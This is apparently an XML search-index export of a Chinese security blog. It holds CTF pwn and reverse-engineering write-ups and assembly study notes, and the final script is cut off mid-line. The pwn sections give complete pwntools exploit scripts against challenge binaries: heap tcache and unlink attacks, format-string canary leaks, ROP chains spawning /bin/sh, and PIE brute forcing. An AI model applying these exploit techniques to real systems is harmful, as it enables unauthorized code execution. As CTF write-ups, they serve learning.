<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019I春秋答题赛</title>
      <link href="/2019/11/05/2019i-chun-qiu-da-ti-sai/"/>
      <url>/2019/11/05/2019i-chun-qiu-da-ti-sai/</url>
      
        <content type="html"><![CDATA[<h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p>做出来了两个pwn题目（其中一个是复现出来的。。。。）：<br>首先说一个pwn2，这个题目真是让我张了不少知识，不仅理解了tcache和unsorted bin attack还学会怎么patch elf文件的libc和ld链接器，同时学了一波文件的_IO_stdout_，下面贴一个“改革春风吹满地”大佬写的exp</p><pre><code>#coding=utf-8from pwn import *local = 1exec_file=&quot;./easy_heap&quot;context.binary=exec_filecontext.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]elf=ELF(exec_file,checksec = False)if local :    argv=[&quot;/glibc/x64/2.27/lib/ld-2.27.so&quot;,&quot;--library-path&quot;,&quot;/glibc/x64/2.27/lib/&quot;,&quot;./easy_heap&quot;]    a=process(argv=argv)    libc=ELF(&quot;/glibc/x64/2.27/lib/libc.so.6&quot;)else:    a=remote(&quot;&quot;)def get_base(a):    text_base = a.libs()[a._cwd+a.argv[0].strip(&#39;.&#39;)]    for key in a.libs():        if &quot;libc.so.6&quot; in key:            return text_base,a.libs()[key]def debug():    #text_base,libc_base=get_base(a)    #script=&quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;    script=&#39;&#39;&#39;    b *(0x7ffff7bd5000+0x0000000000009E2)    b *(0x7ffff7bd5000+0x00000000000009FE)    &#39;&#39;&#39;    gdb.attach(a,script)def fuck(address):    n = globals()    for key,value in n.items():        if value == address:            return success(key+&quot;  ==&gt;  &quot;+hex(address))def menu(idx,flag=True):    if flag:        a.sendlineafter(&quot;2. free\n&quot;,str(idx))    else:        a.sendlineafter(&quot;2. free&quot;,str(idx))def add(content,flag=True):    menu(1,flag)    if flag:        a.sendafter(&quot;content:\n&quot;,content)    else:        a.sendafter(&quot;content:&quot;,content)def delete(idx,flag=True):    menu(2,flag)    if flag:        a.sendlineafter(&quot;\n&quot;,str(idx))    else:        a.sendlineafter(&quot;:&quot;,str(idx))add(p64(0x91)+p64(0x91))#0 90是为了之后进入unsortbinadd(p64(0x21)*6)#1add(p64(0x21)*6)#2delete(0)delete(0)delete(0)add(&#39;\x70&#39;)#3 //修改最低字节这时候tcache的最后一个被改成0x70结尾add(&#39;A&#39;)#4 拿出一个add(&#39;A&#39;)#5 get fake chunk 拿到目标for i in range(8):  #多次free进入unsortedbin拿到arean地址    delete(5)add(&#39;\x60\x07\xbd&#39;)#6 地址修改到stdoutdelete(3)delete(3)delete(3)delete(3)add(&#39;\x70&#39;)#7add(&#39;\x70&#39;)#8add(&#39;/bin/sh\x00&#39;)#9add(p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;)#10a.recvuntil(p64(0xfbad1800))a.recvuntil(&quot;\x7f&quot;)libc_base=u64(a.recvuntil(&quot;\x7f&quot;)[-6:]+&#39;\x00\x00&#39;)-131-libc.symbols[&quot;_IO_2_1_stdout_&quot;]fuck(libc_base)delete(7,False)delete(7,False)add(p64(libc_base+libc.symbols[&quot;__free_hook&quot;]-8),False)#11add(&#39;A&#39;,False)add(&quot;/bin/sh\x00&quot;+p64(libc_base+libc.symbols[&quot;system&quot;]),False)delete(9,False)a.interactive()</code></pre><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>还有就是一个栈的题目了，这个题目跟平常哪个格式化字符和栈溢出有所不同，因为它限制了格式化可以打印出的栈里面的数据，本来还有点没头绪，但是得大哥指点，64位的机子上寄存器里面还有很多参数呢，乌拉，果真在寄存器里面泄露出来了一个真实地址哦，真实顶哦：</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level = &#39;debug&#39;r = remote(&#39;120.55.43.255&#39;,30022 )#r = process(&#39;./easy&#39;)libc = ELF(&#39;libc-2.23.so&#39;)r.recvuntil(&#39;Input your name:\n&#39;)one_gadget_offset = 0x4526apayload1 = &#39;%7$p&#39; #7payload3 = &#39;%3$p&#39; #7r.send(payload1)canary = int(r.recv()[0:18],16)print &#39;canary = &#39; + hex(canary)#r.recvuntil(&#39;note:\n&#39;)payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39;*8 + &#39;\x30\x4a&#39;r.send(payload2)r.recvuntil(&#39;Input your name:\n&#39;)#gdb.attach(r)r.send(payload3)ret_1 = int(r.recv()[0:14],16) - 0xf7260#raw_input(&#39;@:&#39;)print &#39;addr = &#39; + hex(ret_1)system_addr = ret_1 + one_gadget_offsetr.recvuntil(&#39;Input the note:\n&#39;)print &#39;system_addr = &#39; + hex(system_addr)payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39; * 8 + p64(system_addr)r.sendline(payload2)r.interactive()</code></pre><h3 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h3><p>这个就比较简单了，主要的难点可能就是一个苹果系统的文件，如果你没有mac,或者没有黑苹果的话，就没法子动态调试，不过base32还是比较容易看出的吧，然后在有一个简单的加密就可了。</p><pre><code>key = [1,2,3,1,4,5,6,7,8,9,10,11,12,13,14,6,15,16,5,17,4,15,10,24,15,18,11,19,20,6,5,1,13,18,17,12,5,10,13,1,44,17,3,13,5,52,4,13,17,21,43,11]flag = {1:&#39;G&#39;,2:&#39;5&#39;,3:&#39;S&#39;,4:&#39;I&#39;,5:&#39;Z&#39;,6:&#39;B&#39;,7:&#39;V&#39;,8:&#39;H&#39;,9:&#39;F&#39;,10:&#39;R&#39;,11:&#39;T&#39;,12:&#39;E&#39;,13:&#39;Y&#39;,14:&#39;L&#39;,15:&#39;M&#39;,16:&#39;U&#39;,17:&#39;D&#39;,18:&#39;4&#39;,19:&#39;Q&#39;,20:&#39;O&#39;,21:&#39;C&#39;,22:&#39;G5&#39;,23:&#39;5S&#39;,24:&#39;SG&#39;,25:&#39;GI&#39;,26:&#39;IZ&#39;,27:&#39;ZB&#39;,28:&#39;BV&#39;,29:&#39;VH&#39;,30:&#39;HF&#39;,31:&#39;FR&#39;,32:&#39;RT&#39;,33:&#39;TE&#39;,34:&#39;EY&#39;,35:&#39;YL&#39;,36:&#39;LB&#39;,37:&#39;BM&#39;,38:&#39;MU&#39;,39:&#39;UZ&#39;,40:&#39;ZD&#39;,41:&#39;DI&#39;,42:&#39;IM&#39;,43:&#39;MR&#39;,44:&#39;RS&#39;,45:&#39;SGM&#39;,46:&#39;M4&#39;,47:&#39;4T&#39;,48:&#39;TQ&#39;,49:&#39;QO&#39;,50:&#39;OB&#39;,51:&#39;BZ&#39;,52:&#39;ZG&#39;,53:&#39;GY&#39;,54:&#39;Y4&#39;,55:&#39;4D&#39;,56:&#39;DE&#39;,57:&#39;EZ&#39;,58:&#39;ZR&#39;,59:&#39;RY&#39;,60:&#39;YG&#39;,61:&#39;GR&#39;,62:&#39;RSD&#39;,63:&#39;DS&#39;,64:&#39;SY&#39;,65:&#39;YZ&#39;,66:&#39;ZZ&#39;,67:&#39;ZGI&#39;,68:&#39;IY&#39;,69:&#39;YD&#39;,70:&#39;DC&#39;,71:&#39;CM&#39;,72:&#39;MRT&#39;}s = &#39;&#39;for i in key:    s += flag[i]import base64print base64.b32decode(s)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32位逆向分析技术</title>
      <link href="/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/"/>
      <url>/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><ul><li>ret n : 在ret指令后给栈指针加上操作数</li><li>test eax,eax 如果eax的值为0，那么逻辑与的运算结果为0，设置ZF为1，否则ZF为0 </li><li>lea ：加载有效地址</li><li>sar : 有符号数右位移指令，这个是算术右位移，补全时用的最高位</li><li>shr : 无符号数右位移指令，这个是逻辑右位移，补全时用0</li><li>shl : 左位移指令，操作数的最高位进入标志位CF,最低位补零</li><li>cdq ：这个一般就是用在除法之前，然后作用就是把32位数字扩展成为64位数字，方法就是把eax的最高位全复制到edx中的每一位，进而形成一个64位数据</li></ul><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>局部变量</strong></p><ol><li>利用栈存放局部变量， 寻找变量：[ebp-xxx]  ，参数调用： [ebp+xxx] ，编译器也可以用 “push reg” 取代指令 “sub esp ,4” 来节省几个字节的空间，”pop ecx”之类的指令也有压缩栈空间的作用，另外局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据。</li><li>还可以利用寄存器来存放局部变量，除了栈占用的2个寄存器，编译器会利用剩下的6个通用寄存器尽可能有效的存放局部变量。</li></ol><p><strong>全局变量</strong></p><ul><li>全局变量通常位于.data段，程序访问全局变量一般会用一个固定的硬编码的地址进行寻址，如果放到了只读段则说明它是一个常量。</li></ul><p><strong>结构体和数组</strong></p><ul><li>其寻址方式一般是[基地址+n] 例如：mov eax, [407030h(基地址) + eax(偏移)]</li></ul><p><strong>虚函数</strong></p><ul><li>待学</li></ul><p><strong>控制语句</strong></p><ul><li>switch case : 跟if else 语句类似，但是如果case 的取值表示一个算术级数，那么编译器会利用一个跳转表来实现。此时jmp dword ptr [4*eax + 004010b0] 指令相当于switch(a) ，根据eax的值进行索引</li></ul><p><strong>转移指令</strong></p><ul><li>短转移：有条件和无条件跳转机器码均为2字节，转移的范围是-128-127字节</li><li>长转移：有条件转移6字节，两字节表示转移类型（je,jg,jns）,四字节表示转移偏移量。无条件转移5字节，因为jmp只需要一个字节，四字节表示偏移即可</li><li>子程序调用(call) : 一类是平常的，类似长转移，一种是调用的参数涉及寄存器，栈等值。例如：”call dword ptr [eax+2]”</li><li>位移量 = 目的地址 - 起始地址 - 跳转指令本身的长度</li></ul><h4 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h4><ul><li>整数加减法:<br>一般情况下就是add sub这些，但是因为编译优化的存在，这些明显的指令会被替换，lea指令允许用户在一个时钟内完成c = a + b + 78h的计算，其中a b c都是在有寄存器的情况下有效，会编译成lea c,[a+b+78h],这种技巧可以使多个变量的求和在一个指令周期内完成，同时可以通过任何寄存器返回结果。例如： lea eax,[eax+ecx+78h] （78h不是固定的,只是表明可以是立即数）</li><li>整数乘法<br>这一般就是mul和imul了，但是优化会进行改变，如果乘2的次幂较大可能用shl左移指令，同时也可能会用lea指令，类似于上面的加法。</li><li>整数的除法<br>这个一般是div,idiv,除法代价高，大概需要比乘法运算多消耗十倍的CPU时钟，这个的替换类似于乘法，也是当除数是2的幂 的话，无符号尽量用shr,有符号尽量用sar，同时优化的时候尽量会把除法替换成乘法一般就是倒数相乘a/b=a*(1/b)</li></ul><h4 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h4><ul><li>字符串大小写转换:<br>大写字母 41h - 5Ah 小写字母 61h - 7Ah 它们之间的转换方式就是原来ASCII的值+/- 20h<br>还有一种大小写转化方法是基于位操作，我们可以发现二进制表示的时候大写字母A的第五位是0，而小写a的第五位是1，其他可以类推，所以就有以下方式<pre><code>Main    proc near         lea bx, title+!         mov cx,31B20:          mov ah,[bx]          cmp ah,61h          jb B30          cmp ah,7Ah          ja B30          and ah ,1101 1111b  ;and 将ah的第五位指令置0(11011111b = DFh)          mov [bx],ahB30:          inc bx          loop B20          retMain    endp</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 加密与解密 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reserve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编知识点</title>
      <link href="/2019/09/17/hui-bian-zhi-shi-dian/"/>
      <url>/2019/09/17/hui-bian-zhi-shi-dian/</url>
      
        <content type="html"><![CDATA[<h4 id="汇编中补码转换"><a href="#汇编中补码转换" class="headerlink" title="汇编中补码转换"></a>汇编中补码转换</h4><p>1.补码可以先减1，然后按位取反。<br>2.从右往左遇见第一个1不变，然后向左按位取反（符号位除外）<br>3.对于16进制数 ：取反的方法就是用15减去改数字中的每一位 ：<br>6A3D –&gt; 95C2+1 –&gt; 95C3 （这只是个例子，正数的话补码和源码相等）</p><h4 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h4><p>大小端存储对应的是存储器，在寄存器里面没有大小端存储这一说。</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>16进制数字取反的方法就是用15减去该数字</p><h4 id="正负数判断"><a href="#正负数判断" class="headerlink" title="正负数判断"></a>正负数判断</h4><p>16进制的补码最高位&gt;=8的话就是负数，否则是整数<br>但是记住，计算机中正数的补码，反码，源码，相同。</p><h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><img src="/2019/09/17/hui-bian-zhi-shi-dian/1.png" title="This is an image"><img src="/2019/09/17/hui-bian-zhi-shi-dian/2.png" title="This is an image"><p>XCHG ： 交换指令，内容交换</p><p>ADC  EAX,EBX  –&gt; EAX = EAX + EBX + CF</p><p>INC EAX  –&gt; EAX = EAX + 1</p><p>SBB EAX,EBX –&gt; EAX = EAX - EBX - CF</p><p>NEG:取补指令  NEG(neg)   NEG EAX –&gt; 对操作数取补，就是用0减去改操作数 或者 是按位取反 + 1 ，它的操作数可以是寄存器也可以是存储单元，同时改指令可以影响标志寄存器。如果操作数是0，那么进位标志为0，否则进位标志为1。</p><p>shl   shl eax ,cx  –&gt; 将eax中的二进制数字左移cx位，相当于乘上2的cx次方</p><h4 id="标志状态"><a href="#标志状态" class="headerlink" title="标志状态"></a>标志状态</h4><p>CF : 进位标志，运算结果最高位产生进位或者借位的话 CF 置1，否则CF 清0。</p><p>ZF : 零标志位，运算结果为0，则置1，否则置0</p><p>SF ： 符号标志位，跟运算结果的最高位相同</p><p>OF ： 溢出标志位，反映有符号数是否产生了溢出。 判断：符号位和最高数值位一致则未溢出，否则溢出。</p><p>PF : 奇偶标志位，反映最低一个字节中的含有“1”的位数，偶数则被置1，奇数被置0。</p><p>AF ： 辅助进位标志位 ： 反映在算术运算中第三位是否产生进位或者结尾。或者最低的4位是否有借位或者进位。有则置1，否则置0</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019第五空间pwn题解</title>
      <link href="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/"/>
      <url>/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="於讴"><a href="#於讴" class="headerlink" title="於讴"></a>於讴</h3><p>首先是一个简单的逆向分析<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/1.png" title="This is an image"><br>只要大于或等于1000即可，接下来就是一个很简单的栈溢出的ROP利用：</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;debug&#39;r = process(&#39;./pwn&#39;)offset = 0x18r.sendline(&#39;1000&#39;)pop_rdi_ret = 0x0000000000414fc3elf = ELF(&#39;./pwn&#39;)main_addr = 0x0000000004007C3libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]puts_plt = elf.symbols[&#39;puts&#39;]print hex(puts_plt)&#39;&#39;&#39;rop = [    pop_rdi_ret,    libc_start_main_got,    puts_plt,    main_addr,]&#39;&#39;&#39;#gdb.attach(r,&#39;b *0x0000000004007E1\nc&#39;)payload1 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(libc_start_main_got) + p64(puts_plt) + p64(main_addr)r.recvuntil(&#39;OH, WHY ARE YOU SO GOOD?\n&#39;)r.sendline(payload1)libc_start_main_addr = u64(r.recvuntil(&#39;\x7f&#39;).ljust(8,&#39;\x00&#39;))print hex(libc_start_main_addr)libc = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)libc_base = libc_start_main_addr - libc.dump(&#39;__libc_start_main&#39;)system_addr = libc_base + libc.dump(&#39;system&#39;)bin_sh_addr = libc_base + libc.dump(&#39;str_bin_sh&#39;)r.sendline(&#39;1001&#39;)payload2 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + p64(main_addr)r.recvuntil(&#39;OH, WHY ARE YOU SO GOOD?\n&#39;)r.sendline(payload2)r.interactive()</code></pre><h3 id="副墨"><a href="#副墨" class="headerlink" title="副墨"></a>副墨</h3><p>这个题目保护全开，属实是有点夸张的，但是漏洞也是比较明显吧？<br>首先见面的就是一个伪随机数的碰撞，然后我不得不吐槽一下了，题目给了格式化字符串漏洞，我们可以泄露canary 同时破解pie的保护，但是坑逼的是题目里面的system函数竟然没给’/bin/sh’字符串，而且泄露的时候不知道为啥，最多泄露的长度就是2个’%p’，那就坑逼了，你要重复泄露两次，一次拿到canary + codebase  一次拿到 一个函数的实际地址来泄露libc 进而得到libc里面的 ‘/bin/sh’字符串 。。。属实是需要很长时间的。。。。（我坑逼的调试了一整个下午。。。）<br>值得注意的是：LibcSearcher碰撞出来的libc不全是对的，要换着多执行几次脚本才能getshell啊！</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from ctypes import *from LibcSearcher import LibcSearcherimport timecontext.log_level=&#39;debug&#39;r = process(&#39;./bf&#39;)name = &#39;%p&#39;name1 = &#39;#%17$p#%18$p&#39;r.sendline(&#39;1&#39;)libc = cdll.LoadLibrary(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)time_now = int(time.time())libc.srand(time_now)r.recvuntil(&#39;your name : \n&#39;)r.sendline(name1)#gdb.attach(r,&#39;b *0x555555554d12\nC&#39;)for i in range(10):    payload = libc.rand() % 0x1869F + 1    r.recvuntil(&#39;Round &#39;+str(i)+&#39; Now guess:&#39;)    r.sendline(str(payload))get1 = r.recv()code1 = hex(int(get1[29:43],16))cookie1 = int(get1[10:28],16)print hex(int(code1,16))print hex(cookie1)codebase = int(code1,16) - 0xd50main_addr = codebase + 0xabfpayload1 = &#39;a&#39; * 0x34 + p64(cookie1) + &#39;a&#39; * 8 +p64(main_addr)r.sendline(payload1)r.recvuntil(&#39;Are you sure want to play the game?\n&#39;)r.sendline(&#39;1&#39;)r.recvuntil(&#39;your name : \n&#39;)gdb.attach(r,&#39;b *0x555555554d12\nC&#39;)r.sendline(name)libc.srand(int(time.time()))for i in range(10):    payload = libc.rand() % 0x1869F + 1    r.recvuntil(&#39;Round &#39;+str(i)+&#39; Now guess:&#39;)    r.sendline(str(payload))get = r.recv()[9:24]_IO_2_1_stdout_addr = int(get,16) - 0x83#code = hex(int(get[10:28],16))#cookie = int(get[10:28],16)#cookie = hex(int(get[29:43],16))#libc_start_main = int(code,16) - 0xf0print &#39;stdout : &#39; +  hex(_IO_2_1_stdout_addr)libc1 = LibcSearcher(&#39;_IO_2_1_stdout_&#39;,_IO_2_1_stdout_addr)libcbase = _IO_2_1_stdout_addr - libc1.dump(&#39;_IO_2_1_stdout_&#39;)system_addr = libcbase + libc1.dump(&#39;system&#39;)print &#39;system_addr : &#39; + hex(system_addr)binsh_addr = libcbase + libc1.dump(&#39;str_bin_sh&#39;)print &#39;binsh_addr : &#39; + hex(binsh_addr)pop_rdi_ret = codebase + 0x0000000000000db3print &#39;pop_rdi_ret : &#39; + hex(pop_rdi_ret)payload1 = &#39;a&#39; * 0x34 + p64(cookie1) + &#39;a&#39; * 8 +p64(pop_rdi_ret)+p64(binsh_addr) +  p64(system_addr) r.sendline(payload1)r.interactive()</code></pre><p>纪念一下：<br>  <img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/2.png" title="This is an image"></p><h3 id="坐忘"><a href="#坐忘" class="headerlink" title="坐忘"></a>坐忘</h3><p>这个题目最初看到有malloc第一时间想到的肯定是堆的题目，但是这是个栈上的题目<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/3.png" title="This is an image"><br>这里的scanf存在栈溢出，同时puts函数可以帮助我们泄露出栈里面的内容，这就使得canary的保护被成功破解，但是这是个静态编译的文件，我们想到的自然就是构造系统调用的rop来getshell，说实话这个rop的构造算是很复杂的了。。。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *from base64 import b64encodecontext.log_level = &#39;debug&#39;r = process(&#39;./pwn9&#39;)r.recvuntil(&#39;&gt;\n&#39;)#gdb.attach(r,&#39;b *0x0000000004011AC\nc&#39;)payload1 = &#39;a&#39; * 9r.sendline(b64encode(payload1))r.recvuntil(&#39;aaaaaaaaa&#39;)canary = u64(&#39;\x00&#39;+r.recv(7))print hex(canary)r.recvuntil(&#39;continue ?&#39;)r.sendline(&#39;a&#39;)r.recvuntil(&#39;&gt;\n&#39;)p2 = &#39;&#39;p2 += p64(0x0000000000401f57) # pop rsi ; retp2 += p64(0x00000000006cb080) # @ .datap2 += p64(0x00000000004715e4) # pop rax ; retp2 += &#39;/bin//sh&#39;p2 += p64( 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp2 += p64( 0x0000000000401f57) # pop rsi ; retp2 += p64( 0x00000000006cb088) # @ .data + 8p2 += p64( 0x0000000000426baf) # xor rax, rax ; retp2 += p64( 0x000000000047cd21) # mov qword ptr [rsi], rax ; retp2 += p64( 0x0000000000401e36) # pop rdi ; retp2 += p64( 0x00000000006cb080) # @ .datap2 += p64( 0x0000000000401f57) # pop rsi ; retp2 += p64( 0x00000000006cb088) # @ .data + 8p2 += p64( 0x00000000004433e6) # pop rdx ; retp2 += p64( 0x00000000006cb088) # @ .data + 8p2 += p64( 0x0000000000426baf) # xor rax, rax ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000046f140) # add rax, 1 ; retp2 += p64( 0x000000000044d821) # syscallgdb.attach(r,&#39;b *0x0000000004011AC\nc&#39;)payload12 = &#39;a&#39; * 8 + p64(canary) + &#39;a&#39; * 8 + p2r.sendline(b64encode(payload12))r.sendline(&#39;no&#39;)r.interactive()</code></pre><h3 id="拈花"><a href="#拈花" class="headerlink" title="拈花"></a>拈花</h3><p>相比于前面的题目，这个就是新手的练习吧？直接一个栈溢出泄露libc然后执行system，最后getshell ,一套操作行云流水</p><pre><code># coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#39;debug&#39;r = process(&#39;./pwn11&#39;)elf = ELF(&#39;./pwn11&#39;)puts_plt = elf.symbols[&#39;puts&#39;]pop_rdi_ret = 0x00000000004012abputs_got = elf.got[&#39;puts&#39;]main_addr = 0x000000000401162offset = 40r.recvuntil(&#39;please input your name\n&#39;)r.sendline(&#39;aaaa&#39;)r.recvuntil(&quot;Let&#39;s start a game,can you guess the key?\n&quot;)#gdb.attach(r)payload1 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload1)r.recvuntil(&#39;fail!\n&#39;)puts_addr = u64(r.recvuntil(&#39;\n&#39;,drop=True).ljust(8,&#39;\x00&#39;))print hex(puts_addr)libc = LibcSearcher(&#39;puts&#39;,puts_addr)libcbase = puts_addr - libc.dump(&#39;puts&#39;)system_addr = libcbase + libc.dump(&#39;system&#39;)binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)r.recvuntil(&#39;please input your name\n&#39;)r.sendline(&#39;aaaa&#39;)payload2 = offset * &#39;a&#39; + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)r.recvuntil(&quot;Let&#39;s start a game,can you guess the key?\n&quot;)r.sendline(payload2)r.interactive()</code></pre><h3 id="一苇"><a href="#一苇" class="headerlink" title="一苇"></a>一苇</h3><p>这个题目开了pie但是给了后门，那几本断定是简单的pie爆破了，无奈python水平还好像不太可以，这个脚本可以直接帮助我们getshell , 但是只后你想关这个linux 终端可能必须用鼠标点那个 X 了，用不了快捷键。。。。无语奥。。。谁有更好的办法可以call我啊，当然1/16的几率，手动也可以。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *import randomoffset = 32 + 8list1 = [&quot;\x0a&quot;,&quot;\x1a&quot;,&quot;\x2a&quot;,&quot;\x3a&quot;,&quot;\x4a&quot;,&quot;\x5a&quot;,&quot;\x6a&quot;,&quot;\x7a&quot;,&quot;\x8a&quot;,&quot;\x9a&quot;,&quot;\xaa&quot;,&quot;\xba&quot;,&quot;\xca&quot;,&quot;\xda&quot;,&quot;\xea&quot;,&quot;\xfa&quot;]while True:    try:        r = process(&#39;./pwn13&#39;)        r.recvuntil(&#39;your choice:&#39;)        r.sendline(&#39;1&#39;)        r.recvuntil(&#39;input massage\n&#39;)        payload = offset * &#39;a&#39; + &#39;\x50&#39; + random.sample(list1,1)[0]        r.sendline(payload)        r.recv()        r.recv()        r.interactive()    except Exception as e:        r.close()        print e</code></pre><h3 id="正定"><a href="#正定" class="headerlink" title="正定"></a>正定</h3><p>这是一个堆的unlink , 从下面可以看出利用的关键所在<br><img src="/2019/08/31/2019-di-wu-kong-jian-pwn-ti-jie/4.png" title="This is an image"></p><p>只要改逻辑就可以了，操作很平常，只不过，最后哪个edit两次属实有点秀了。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;r = process(&#39;./pwn14&#39;)def malloc(size,text):    r.recvuntil(&#39;Your choice : &#39;)    r.sendline(&#39;1&#39;)    r.recvuntil(&#39;Size of note : &#39;)    r.sendline(str(size))    r.sendafter(&#39;Content of note:&#39;,text)def edit(idx,text,size):    r.recvuntil(&#39;Your choice : &#39;)    r.sendline(&#39;2&#39;)    r.sendlineafter(&#39;Index :&#39;,str(idx))    r.sendlineafter(&#39;Size of note : &#39;,str(text))    r.sendafter(&#39;Content of note : &#39;,size)def delete(idx):    r.recvuntil(&#39;Your choice : &#39;)    r.sendline(&#39;3&#39;)    r.sendlineafter(&#39;Index :&#39;,str(idx))global1 = 0x4040a0list = 0x0000000004040C0malloc(0x20,&#39;aa&#39;) # 0malloc(0x80,&#39;bb&#39;) # 1fake_chunk = [    0x0,0x20,    list - 0x18 ,list - 0x10 ,]payload = flat(fake_chunk) + p64(0x20) + 